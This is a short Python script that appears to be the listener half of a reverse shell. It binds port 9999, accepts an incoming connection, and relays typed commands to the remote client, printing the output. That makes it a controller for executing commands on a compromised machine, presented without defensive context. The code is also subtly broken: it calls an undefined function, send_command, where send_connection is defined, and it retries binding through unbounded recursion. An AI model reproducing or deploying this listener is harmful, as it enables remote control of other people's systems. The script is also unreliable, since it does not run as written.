import socket
import sys


def socket_create():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("socket Creation Error: " + str(msg))


def socket_bind():
    try:
        print("Binding socket to Port" + str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error" + str(msg))
        socket_bind()


def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | "+"IP: " + address[0] + "| Port:" + str(address[1]))
    send_command(conn)
    conn.close()


def send_connection(conn):
    while True:
        cmd = input()

        if cmd == "exit":
            conn.close()
            s.close()
            sys.exit()

        if len(cmd) > 0:
            conn.send(str.encode(cmd))
            client_response = (conn.recv(1024).decode("utf-8"))
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
